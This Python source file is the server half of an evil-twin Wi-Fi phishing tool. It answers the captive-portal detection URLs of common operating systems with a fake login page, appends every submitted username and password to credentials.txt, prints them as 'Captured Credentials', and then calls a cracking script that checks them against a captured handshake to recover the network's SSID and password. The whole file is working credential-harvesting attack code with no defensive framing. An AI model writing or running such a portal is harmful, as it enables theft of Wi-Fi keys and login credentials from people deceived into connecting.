import http.server
import socketserver
import urllib.parse
from colorama import Fore, init
init(autoreset=True)
import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
import Compare_pass

class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        captive_test_paths = [
            "/connecttest.txt",
            "/ncsi.txt",
            "/generate_204",
            "/hotspot-detect.html",
            "/redirect",
            "/fwlink"
        ]
        if self.path in captive_test_paths:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
            return
        else:
            super().do_GET()

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]

        with open("./../credentials.txt", "a") as f:
            f.write(f"Username: {username} | Password: {password}\n")

        print(Fore.MAGENTA + '\n[+] Captured Credentials:')
        print(Fore.CYAN + f"  -> Username: {username}")
        print(Fore.CYAN + f"  -> Password: {password}")

        try:
            from Compare_pass import main as crack_main
            result = crack_main()
            if result:
                ssid, pw = result
                print(Fore.GREEN + f"\n[Returned] SSID: {ssid}, Password: {pw}")
            else:
                print(Fore.RED + "\n[Returned] No valid credentials found or handshake failed.")
        except Exception as e:
            print(Fore.RED + f"[!] Error running cracking script: {e}")

        self.send_response(302)
        self.send_header('Location', '/')
        self.end_headers()

if __name__ == '__main__':
    import os
    os.chdir(r"./Captive_Portals")
    with socketserver.TCPServer(('0.0.0.0', 8080), CaptiveHandler) as httpd:
        print(Fore.GREEN + "Serving captive portal on http://10.0.0.1:8080")
        httpd.serve_forever()
